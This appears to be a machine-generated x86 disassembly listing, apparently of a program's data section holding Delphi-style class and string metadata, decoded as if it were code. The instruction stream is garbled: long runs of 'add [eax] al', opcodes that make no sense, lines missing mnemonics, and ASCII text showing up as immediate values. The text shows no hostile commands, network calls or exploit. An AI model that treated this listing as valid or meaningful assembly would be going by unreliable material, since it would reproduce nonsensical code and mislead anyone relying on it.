jbe r-xdata
add [ edx ] cl
push ebx
outsb
js r-xdata
or [ esi + 0x65 ] cl
ja r-xdata
add [ eax + edx + 0x20040 ] bl
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x100040 ] bl
add al [ eax ]
add al [ eax ]
mov eax eax
and [ edi + 0x42 ] dh
add al [ eax ]
add al cl
adc [ eax ] eax
add [ eax ] eax
add al 0x54
js r-xdata
push esp
outsd
push ebx
je r-xdata
add [ eax ] al
pop es
popad
xor eax 0x432f3c00
add [ edi ] al
push ebx
je r-xdata
imul ebp [ fs : esi + 0x67 ] 0x20002
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ eax + eax ] bh
movsb [ edi ] [ esi ]
sub eax 0x530a0043
popad
jbe r-xdata
add [ edx ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
popad
insd
add al [ eax ]
add al ch
add al [ ecx ]
add al [ eax ]
or [ ebp + 0x6e ] al
add dh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc [ eax ] al
outsb
jae r-xdata
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ ebx + 0x427720c0 ] cl
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
popad
jae r-xdata
add [ edx ] al
js r-xdata
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x20002
cmp al 0x0
adc al 0x2e
inc ebx
add [ ebx + edx * 2 ] cl
popad
jbe r-xdata
dec esi
popad
insd
add al [ gs : eax ]
add al ch
add al [ ecx ]
add al [ eax ]
or [ ebp + 0x6e ] al
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ edx ] al
add [ esi ] cl
mov ah 0x2d
inc ebx
push esp
outsd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ edx ] al
add [ edi + esi * 2 ] bl
popad
jae r-xdata
inc ebx
insb
outsb
inc edx
add [ eax + 0x4260 ] bl
add [ edi ] al
add [ edx ] al
mov dl 0x77
inc edx
add [ edx ] al
add [ edx ] al
salc
ja r-xdata
or eax [ eax ]
add cl [ edi + 0x2004277 ]
insd
add al [ eax ]
add al ch
add al [ ecx ]
add al [ eax ]
or [ ebp + 0x6e ] al
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x20002
popad
jne r-xdata
adc al [ eax ]
xchg esp eax
and eax [ ebx ]
loopne r-xdata
add [ ebx ] cl
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ edx ] al
div [ edi + 0x42 ]
add [ edx ] al
add [ edx ] al
sbb bh [ eax + 0x42 ]
add [ edx ] al
add [ edx ] al
inc edx
js r-xdata
add [ edx ] al
add [ edx ] al
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x77
inc edx
add [ eax ] al
popad
je r-xdata
add [ eax ] al
add [ eax + 0x4305ffff ] al
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4309ffff ] al
outsd
insd
insd
popad
push esp
js r-xdata
or [ ebx + 0x61 ] al
jo r-xdata
je r-xdata
add [ edx ] al
add [ edx ] al
mov bh [ eax + 0x42 ]
add [ edx ] al
add [ edx ] al
mov bh 0x78
inc edx
add [ edx ] al
add [ edx ] al
loope r-xdata
add [ eax - 0x80000000 ] al
je r-xdata
adc al [ eax ]
adc [ eax ] al
imul ecx [ eax + edx + 0x40 ] 0x0
enter 0x4333 0x0
dec eax
xor al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5109ffff ] al
jne r-xdata
sbb al 0x34
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c09ffff ] al
imul ebp [ esi + 0x65 ] 0x61657242
pushfd
adc [ eax ] al
adc al 0x0
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec [ ecx ]
inc esp
insb
imul ebp [ ebp + 0x69 ] 0x40726574
adc al [ eax ]
sub al 0x24
inc ebx
add al al
xor [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
arpl [ ecx + 0x74 ] bp
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440dffff ] al
insb
imul ebp [ ebp + 0x69 ] 0x54646574
js r-xdata
inc eax
jo r-xdata
inc edx
add [ edx ] al
add [ edx ] al
add [ ecx + 0x42 ] bh
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc ebx
push 0x104c7261
inc eax
add [ eax - 0x53ffbccc ] dl
xor al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e12ffff ] al
popad
insd
push esi
popad
insb
jne r-xdata
add [ eax ] al
cmp bh 0xff
or eax 0x696c6544
insd
imul esi [ ebp + 0x64 ] 0x74786554
inc ebx
add ah bh
xor eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jb r-xdata
inc eax
add [ eax ] 0x0
add [ eax + 0x530effff ] al
push ebx
jo r-xdata
adc [ eax ] al
in al 0x33
inc ebx
add [ eax + 0x34 ] ch
inc ebx
add [ ecx ] al
add al [ eax ]
mov eax eax
cwde
jns r-xdata
imul ebp [ esi + 0x67 ] 0x61644173
jb r-xdata
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
imul esp [ ebx + 0x74 ] 0x696c6544
insd
imul esi [ ebp + 0x72 ] r-xdata
sbb al 0x0
add dh bh
sub al 0x0
jns r-xdata
add [ edi + ecx ] dl
push eax
push ebx
je r-xdata
jb r-xdata
je r-xdata
add [ eax ] al
cmp bh 0xff
push cs
push ebx
je r-xdata
je r-xdata
outsb
dec ecx
je r-xdata
adc [ eax ] al
push es
dec ecx
add [ 0x74535416 ] dl
jb r-xdata
inc eax
add [ esi ] al
imul ebp [ esi + 0x67 ] 0x6d657449
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al [ eax ]
nop
mov ah 0x79
inc edx
add [ 0x7453540f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530fffff ] al
je r-xdata
add [ eax ] dl
inc eax
add ah ah
xor eax [ ebx ]
push 0x1004334
inc eax
add cl ch
aaa
int 0xfd
dec [ ebp + 0x2fe90040 ]
int 0xfd
dec [ ebp + 0x27e90040 ]
int 0xfd
dec [ ebp + 0x79480040 ]
inc edx
jo r-xdata
test [ edx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 + 0x42 ] bh
add [ ebx + edi * 2 ] ch
inc edx
add bl dh
jpo r-xdata
imul ebp [ esi + 0x67 ] 0x6d657449
jb r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc eax
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
pop es
inc esi
push ebx
je r-xdata
push esi
add al [ eax ]
lea eax [ eax ]
jl r-xdata
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74726f53
add [ eax ] al
outsb
js r-xdata
add al [ eax ]
add [ eax + edx + 0x49060040 ] bl
js r-xdata
outsb
dec ecx
je r-xdata
and [ ebx ] al
int3
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x7c ] ah
inc edx
dec ecx
outsb
js r-xdata
push es
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
fdivr [ ecx + 0x42 ]
outsd
jb r-xdata
imul ebp [ esi + 0x67 ] 0x1c000002
inc eax
add [ eax + eax ] al
add [ eax ] al
add al [ edi ]
inc esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
je r-xdata
add [ eax + eax ] bl
add [ eax ] al
add eax 0x73694c46
je r-xdata
aaa
inc ebx
add [ eax ] bl
cmp [ ebx ] al
sbb al 0x38
inc ebx
add [ eax ] ah
cmp [ ebx ] al
add al 0x27
inc ebx
add [ ecx + edi + 0x39ec0043 ] dl
inc ebx
add al al
cmp al [ ebx ]
mov [ edi ] gs
inc ebx
add [ eax ] ah
cmp eax [ ebx ]
test al 0x3b
inc ebx
add [ eax + 0x35 ] dl
inc ebx
add [ eax + 0x35 ] ah
inc ebx
add [ edi + ebx ] dl
inc ebx
add ah bh
xor eax 0x36640043
inc ebx
add ah ah
inc ebx
add [ eax + 0x78004326 ] dh
cmp [ ebx ] al
sub [ ecx ] ch
inc ebx
add ah bh
sub [ ebx ] eax
mov ah 0x38
inc ebx
add ah al
cmp [ ebx ] al
pushad
sub al [ ebx ]
mov ah 0x2a
inc ebx
add [ eax ] dl
sub eax [ ebx ]
sbb al 0x2b
inc ebx
add [ eax ] dl
sub al 0x43
add [ ebp + ebp + 0x2db40043 ] ah
inc ebx
add [ esi + ebp ] dl
inc ebx
add [ esi + ebp ] ah
inc ebx
add [ edi + ebp ] bh
inc ebx
add ah al
xor eax 0x35e00043
inc ebx
add [ eax ] bl
cmp [ ebx ] eax
aaa
inc ebx
add [ eax + 0x3b ] ah
inc ebx
add [ eax + 0x3b ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
xchg esp eax
jns r-xdata
add [ eax + eax ] cl
add [ ebp + ebp * 2 + 0x56ac0042 ] dh
jb r-xdata
js r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x40000000
add [ eax ] al
add [ eax ] cl
inc esp
jns r-xdata
insd
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah cl
xor al 0x43
pop eax
inc ebx
outsd
insd
jo r-xdata
inc eax
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
ja r-xdata
add al [ fs : eax ]
pushfd
adc [ eax ] al
and [ eax ] al
add [ eax ] al
push es
inc esi
inc ebx
outsd
jne r-xdata
add [ eax ] al
and al [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
pushfd
adc [ eax ] al
add eax [ eax ]
js r-xdata
jg r-xdata
jae r-xdata
hlt
insb
imul esp [ ebx + 0x61 ] 0x2736574
add [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] ch
add [ eax ] al
add [ esi ] cl
inc esi
inc ebx
popad
jae r-xdata
add al [ gs : eax ]
je r-xdata
add [ ebx + edx + 0x20f80043 ] bl
inc ebx
add ah cl
pop ds
inc ebx
add al ch
inc edx
add [ esp + ecx * 2 ] al
imul esi [ ebx + 0x74 ] 0x9c000002
adc [ eax ] al
cmp eax [ ebx ]
push es
inc ebx
jb r-xdata
add [ edx ] cl
sub [ eax ] al
cmp edi [ edi + 0x42 ]
dec edx
add [ edi ] ah
bound ebp [ edx + 0x65 ]
add [ ebp ] cl
push ebx
outsb
jae r-xdata
pushfd
adc [ eax ] al
and al 0x0
add [ eax ] al
or [ esi + 0x43 ] eax
popad
jo r-xdata
add [ eax ] al
adc [ eax ] al
popad
int3
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x3bc40026
inc ebx
add [ esi ] al
add [ eax ] bl
add al al
jle r-xdata
dec edx
add [ esi ] cl
je r-xdata
inc esi
inc edx
add [ eax ] bh
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x69676e61
outsb
add al [ bx + si ]
add [ eax ] al
adc [ eax ] al
arpl [ ecx + 0x74 ] bp
jns r-xdata
add [ edx ] al
add [ 0x43366400 ] dh
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
or [ eax ] al
add al [ eax ]
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
add eax [ eax ]
add [ eax ] al
popad
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
cld
add [ edx ] cl
sbb [ eax ] eax
pop ss
add [ eax ] ch
add [ ebx ] bh
jg r-xdata
add [ edx ] cl
verw [ esi + 0x7d ]
inc edx
add [ edx ] cl
adc [ eax ] eax
xchg ebx eax
jge r-xdata
add [ ecx ] ch
jge r-xdata
push cs
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] ch
add [ eax ] al
add [ edi ] al
inc esi
push ebx
outsd
jb r-xdata
add [ eax ] al
push es
dec ecx
outsb
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
add al [ eax ]
add al [ eax ]
dec eax
add ah ah
inc ebx
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + eax ] si
pushfd
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
js r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
or ecx [ edi + 0x77 ]
outsb
jae r-xdata
add [ 0x61656c43 ] al
jb r-xdata
add [ 0x4335fc00 ] ah
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ cs : eax + 0x35 ] dl
inc ebx
add [ ebx ] al
inc ecx
add eax [ fs : eax ]
pushfd
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x7f ] bh
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
js r-xdata
je r-xdata
add [ edx ] cl
sub [ eax ] eax
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ebx
jb r-xdata
imul ebp [ esi + 0x67 ] 0x7473694c
add ah al
cmp eax [ ebx ]
push es
add [ edx ] cl
adc al [ eax ]
enter 0x427d 0x0
dec edx
add [ ebx ] dl
add [ eax ] dl
jle r-xdata
add ah dl
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] dh
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
arpl [ edx + eax ] si
add [ eax ] al
push cs
add [ ebx + 0x7c ] dh
inc edx
add [ eax + eax - 0xc ] al
[ ecx + 0x4400427c ]
add ah dh
call esp
jl r-xdata
add [ ecx + edx * 2 ] ch
inc edx
add [ ecx ] ch
add [ eax ] al
add [ ebx ] cl
inc esi
inc esp
jne r-xdata
add al [ fs : eax ]
pushfd
adc [ eax ] al
add al [ eax ]
add eax 0x65646e49
js r-xdata
add al [ eax ]
add al [ eax ]
add [ edi + esi + 0x43 ] ah
add [ esi + eax * 2 ] al
imul ebp [ esi + 0x64 ] 0x10000003
inc eax
add [ eax ] cl
add [ ebx ] al
add [ eax + 0x7f ] bh
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
add al 0x53
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
js r-xdata
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add [ eax + edx + 0x20040 ] ebx
push 0x65676e61
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
js r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
js r-xdata
add [ esi ] al
inc esp
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x7f ] bh
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add al [ eax ]
inc ebp
add [ eax + 0x35 ] ah
inc ebx
add [ ecx ] cl
inc ecx
bound ebp [ edx + 0x65 ]
arpl [ ebx + esi * 2 + 0x2 ] si
add [ edx ] al
add [ edi ] ah
add ah cl
xor al 0x43
add [ edi ] al
inc esp
jae r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
je r-xdata
popad
add [ esi + 0x7e ] cl
inc edx
add [ edx ] cl
adc eax 0x427e8000
add [ edx ] cl
sbb [ eax ] al
sar [ esi + 0x42 ] 0x0
dec edx
add [ ecx ] bl
add [ edi ] dl
add [ edx ] cl
daa
add [ edx ] dh
add [ eax + 0x38 ] bh
inc ebx
add [ edi ] al
dec ecx
outsb
js r-xdata
add [ edx ] al
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] cl
in al 0x36
inc ebx
add [ edx ] al
or [ eax ] al
add al [ eax ]
js r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
push es
dec ecx
outsb
js r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor eax 0x43366400
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ edx ] al
add [ edi ] al
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add al [ eax ]
and eax 0x4335fc00
jb r-xdata
add [ 0x65646e49 ] al
add ax [ eax ]
pushfd
adc [ eax ] al
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ ecx ] al
push ebx
add al [ eax ]
add al [ eax ]
inc eax
add [ eax + edi + 0x49060043 ] dh
outsb
jae r-xdata
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add [ eax + 0x12 ] al
jns r-xdata
inc eax
adc al [ eax ]
add al [ eax ]
add [ ebx + 0x2 ] edx
add [ edx ] al
add [ edi ] dl
les edi [ eax ]
inc ebx
add [ ecx + ecx * 2 ] cl
outsb
jae r-xdata
add [ eax ] al
inc eax
adc al [ eax ]
add al [ eax ]
add [ ebx + 0x2 ] edx
add [ eax ] al
add [ eax + eax * 2 ] bl
add [ eax ] al
js r-xdata
add [ 0x65646e49 ] al
jb r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
js r-xdata
add [ eax ] al
add [ eax ] al
add al 0x53
jb r-xdata
popad
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
js r-xdata
add [ eax ] cl
add [ edi ] al
inc ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add al [ eax ]
and al 0x0
pushad
cmp eax [ ebx ]
add al 0x53
push ebx
add al [ eax ]
add [ eax ] al
sbb al 0x40
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
js r-xdata
inc edx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ebx
add [ edx ] cl
inc ebx
jne r-xdata
or al [ ebx + 0x75 ]
jae r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + eax ] si
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
js r-xdata
outsd
jb r-xdata
jae r-xdata
add dl [ ecx ]
add [ edx ] 0x2
add [ edx ] al
cmp [ eax + 0x20042 ] eax
add bl [ eax + eax * 4 + 0x42 ]
add [ edx ] al
insb
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
jo r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
outsd
jb r-xdata
add [ eax + 0x3b ] ah
inc ebx
add [ ebx + edx * 2 ] al
js r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x65646e49
popad
je r-xdata
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb al 0x77
inc edx
add [ eax ] al
add [ edi ] al
inc ebx
insb
add [ edx ] al
add [ eax + 0x20042 ] 0x512c0002
add [ edx ] al
je r-xdata
add [ edx ] al
pop esp
add [ edx ] 0x2
outsd
insb
add al [ eax ]
add al bl
jns r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
inc eax
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ fs : eax ] dl
inc eax
add [ edx ] ch
add [ eax ] al
inc [ eax + 0x3c ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430dffff ] al
popad
jae r-xdata
add [ esi ] al
add [ edx ] al

dec edi
jae r-xdata
add [ edx ] 0x2
insd
push ebx
outsd
jb r-xdata
inc edx
add [ ecx ] ch
add [ eax ] al
[ ecx ]
add al [ eax ]
add al [ ecx + 0x2004280 ]
add [ edx ] al
add [ ecx + edx * 2 ] ch
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
inc edx
add [ edx ] al
add [ edx ] al
adc [ eax + 0x20042 ] eax
add bh [ ecx ]
add [ ecx ] al
add [ edi ] al
inc ebx
outsd
insd
jo r-xdata
inc esi
jae r-xdata
add [ eax + 0x4f0bffff ] al
ja r-xdata
add [ eax ] al
push ebx
outsb
jae r-xdata
adc [ eax ] al
sub [ eax ] al
add bh bh
add [ ebx ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5306ffff ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add bh bh
sub [ eax ] eax
add bh bh
jb r-xdata
int3
inc eax
add [ eax + 0x46 ] ch
inc eax
add al cl
cmp eax 0x3e4c0043
inc ebx
add [ eax ] al
add [ eax ] dl
add [ eax - 0x35ffbd7f ] ch
add [ ebx ] al
add bl ch
add [ edx ] 0x400ca
das
add [ edx ] 0x4a
add [ 0x42827300 ] al
add [ edx ] cl
push es
add [ edi + 0x42004282 ] dh
add ah dh
inc [ eax ]
add [ edx ] 0x42
add ah dh
dec [ edx - 0x7d ]
inc edx
add [ edx ] al
hlt
bound ebp [ edx + 0x65 ]
arpl [ ebx + esi * 2 - 0x70 ] si
add [ ecx + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi + 0x42 ] al
add [ eax ] al
sbb al 0x81
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004281 ] ah
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ esp + edi + 0x3ce80043 ] bl
inc ebx
add [ eax ] al
cmp eax 0x46680043
outsb
je r-xdata
add al [ eax ]
add al [ eax ]
mov eax eax
jl r-xdata
dec edi
jbe r-xdata
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsb
inc ebx
push 0x65676e61
aam 0x46
inc edx
add [ eax ] bh
add [ eax ] al
aam 0x46
inc edx
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
sub_428075
dec [ edx ]
dec edi
outsb
inc ebx
push 0x69676e61
outsb
add [ bx + si ] dl
inc eax
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0bffff ] al
ja r-xdata
inc esi
jae r-xdata
int3
inc eax
add [ eax + 0x46 ] ch
inc eax
add al cl
cmp eax 0x3e4c0043
inc ebx
add [ eax ] al
add [ eax ] dl
add [ eax - 0x35ffbd7f ] ch
add [ ebx ] al
add bl ch
add [ edx ] 0x400ca
das
add [ edx ] 0x4a
add [ 0x42827300 ] al
add [ edx ] cl
push es
add [ edi + 0x42004282 ] dh
add ah dh
inc [ eax ]
add [ edx ] 0x42
add ah dh
dec [ edx - 0x7d ]
inc edx
add [ edx ] al
hlt
bound ebp [ edx + 0x65 ]
arpl [ ebx + esi * 2 - 0x70 ] si
add [ ecx + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi + 0x42 ] al
add [ eax ] al
sbb al 0x81
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004281 ] ah
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ esp + edi + 0x3ce80043 ] bl
inc ebx
add [ eax ] al
cmp eax 0x46680043
sub_428982
push [ 0x4d00428a ]
add bh bh
dec [ ebx ]
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc edi
add [ esi + eax * 2 ] bh
inc ebx
add [ esi ] al
inc ebx
jb r-xdata
add [ edx ] al
add [ ecx ] cl
inc ecx
inc esi
popad
je r-xdata
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ eax ] al
int3
or [ ecx + 0x46 ] eax
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add eax [ eax ]
pop esp
mov al [ edx ]
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ edx ] al
add [ ecx ] cl
inc ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ eax ] al
int3
sub_428cfc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi - 0x728fffbe ] cl
inc edx
add [ ebp + 0x428d ] cl
add [ eax ] al
add cl al
lea eax [ edx ]
sbb [ eax ] al
add [ eax ] al
mov al 0x8a
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah bh
dec eax
inc ebx
add [ esp + edi + 0x49f40043 ] bl
inc ebx
add [ eax ] al
cmp eax 0x48300043
inc ebx
add [ eax + 0x6800434a ] ah
dec eax
inc ebx
add [ esi + edi + 0x43 ] cl
add [ eax ] ah
dec edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
pushfd
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] eax
popad
jo r-xdata
pop [ edx ]
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add al [ eax ]
and eax 0x43492800
add [ 0x61656c43 ] al
jb r-xdata
arpl [ ecx + 0x74 ] bp
jns r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
adc al 0x8f
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ eax + 0x49 ] al
inc ebx
add [ esi ] cl
dec esp
outsd
popad
inc esi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edi + ecx * 4 ] dl
add [ esi ] al
add bh cl
lea eax [ edx ]
dec ebp
add bh bh
push esi
lea eax [ edx ]
inc edx
add ah dh
[ ebx ]
mov es [ edx ]
inc edx
add ah dh
[ ecx - 0x72 ]
inc edx
add [ edx ] al
hlt
add [ eax ] al
add ah dh
dec ecx
inc ebx
add [ edi ] al
push ebx
insd
push ebx
je r-xdata
add [ eax ] al
add [ eax ] eax
push es
